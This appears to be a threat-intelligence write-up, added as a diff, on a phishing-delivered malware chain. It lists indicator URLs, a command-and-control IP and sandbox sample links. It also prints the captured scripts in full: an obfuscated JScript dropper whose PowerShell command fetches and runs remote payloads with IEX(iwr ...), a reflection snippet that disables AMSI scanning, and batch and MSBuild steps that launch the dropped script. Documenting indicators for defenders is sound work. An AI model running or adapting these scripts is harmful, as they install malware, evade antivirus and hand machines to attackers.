@@ -1,0 +1,74 @@
+---------------------------------------------------------------
+IOCs
+---------------------------------------------------------------
+
+URLs (Email):
+https://sites.google.com/view/drive-w31ues1j/screen?fileid=[numbers]
+
+Payload
+https://1006058532-atari-embeds.googleusercontent.com/a8055b0b-e14e-4951-b1cb-5e7c629f8416
+https://www.evcidrive.com/wp-content/uploads/2018/07/sd2.ps1
+https://www.evcidrive.com/wp-content/uploads/2018/07/personnelfKvJR
+https://www.evcidrive.com/wp-content/uploads/2018/07/windwardlypDFz.ps1
+https://www.evcidrive.com/wp-content/uploads/2018/07/nosochthonographyrVEx.php
+https://www.evcidrive.com/wp-content/uploads/2018/07/2m230s1m7qaj.ps1
+https://www.evcidrive.com/wp-content/uploads/2018/07/intitleskosx.php?q=rDiPs6kRa0SE
+https://www.evcidrive.com/wp-content/uploads/2018/07/democratismWY.php
+
+Koi C2
+http://217.12.220.55/daydreamlike.php
+http://217.12.220.55/index.php?id=&subid=
+
+
+---------------------------------------------------------------
+Scripts
+---------------------------------------------------------------
+
+-- https://www.evcidrive.com/wp-content/uploads/2018/07/2m230s1m7qaj.ps1 --
+
+Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+public class WinAp {
+	[DllImport("user32.dll")]
+	[return: MarshalAs(UnmanagedType.Bool)]
+	public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+}
+"@
+ 
+$window = (Get-Process -id $pid).MainWindowHandle
+[WinAp]::ShowWindow($window,0);
+
+
+
+-- https://www.evcidrive.com/wp-content/uploads/2018/07/democratismWY.php --
+
+var f1="Scr",f2="ing.Fi",f3="stemOb" var fso = new ActiveXObject(f1+"ipt"+f2+"leSy"+f3+"ject") var w1="WSc",w2="riPt",w4="eLl" var wsh=w1+w2+".sH"+w4 var bbj=new ActiveXObject(wsh) var fldr=GetObject("winmgmts:root\\cimv2:Win32_Processor='cpu0'").AddressWidth==64?"SysWOW64":"System32" var rd=bbj.ExpandEnvironmentStrings("%SYSTEMROOT%")+"\\"+fldr+"\\WindowsPowerShell\\v1.0\\powershell.exe" var agn='r'+bbj.RegRead('HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuid')+'r.js' if (WScript.ScriptName != agn) { var fs5="yFi" try { fso["Cop"+fs5+"le"](WScript.ScriptFullName, bbj.ExpandEnvironmentStrings("%programdata%")+"\\"+agn) } catch (e) {} } var mtx_name="7zBAYRGHCAD0" var mtx_file = bbj.ExpandEnvironmentStrings("%tem"+"p%")+"\\"+mtx_name var fs1="leteFi" var fs2="leExis" try { fso["De"+fs1+"le"](mtx_file) } catch (e) {} if (!fso["Fi"+fs2+"ts"](mtx_file)) { bbj.Run(rd+" -command \"$yvf155d=('R'+'e'+'f' -as [Type]).('A'+'s'+'s'+'e'+'m'+'b'+'ly').GetTypes();$tspn7w36n = 'https://www.evcidrive.com/wp-content/uploads/2018/07'; Foreach($r7c7a in $yvf155d) {if ($r7c7a.Name -like '*ams*U?*ls') {$c=$r7c7a}}; $env:paths = '" + mtx_name + "'; IEX(iwr -usebas ($tspn7w36n+'/nosochthonographyrVEx.php')); IEX(iwr -usebasic ($tspn7w36n+'/windwardlypDFz.ps1'))\"", 0) }
+https://www.evcidrive.com/wp-content/uploads/2018/07/nosochthonographyrVEx.php
+
+$vl1 = ("bL7ycHduD111iig53bS3kJKX5V3FDypcIJeciig53bS3kJKXbhOdB4OjYJeOiig53bS3kJKXOjyeM8jvLqMViig53bS3kJKXYne3tiEzIQcziig53bS3kJKXaWgGejwCA6h4iig53bS3kJKXmq7fQe6WuFHh" -match "iig53bS3kJKX"); $v2=$c.GetFields("NonPublic,Static");Foreach($v3 in $v2) {if ($v3.Name -like "*am*ed") {$v3.SetValue($null, $vl1)}};
+tmp1A42.tmp.Exec.bat
+
+setlocal
+set errorlevel=dummy
+set errorlevel=
+move %programdata%\rDiPs6kRa0SE.js %programdata%\D1UYX7AUUU10.js; && start /B wscript %programdata%\D1UYX7AUUU10.js
+exit %errorlevel%
+
+
+
+-- https://www.evcidrive.com/wp-content/uploads/2018/07/intitleskosx.php --
+
+<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+    <Target Name="removed">
+        <Exec Command="move %programdata%\rDiPs6kRa0SE.js %programdata%\M15RSO5UFQFBMS6.js; &amp;&amp; start /B wscript %programdata%\M15RSO5UFQFBMS6.js"/>
+    </Target>
+</Project>
+
+
+---------------------------------------------------------------
+Samples
+---------------------------------------------------------------
+
+https://tria.ge/251006-s27nzacr8y/behavioral1
+https://bazaar.abuse.ch/sample/d0f6035cd668cccae2f73671877942a5078df34acfdceb32d7adc3fb7dcd0544/
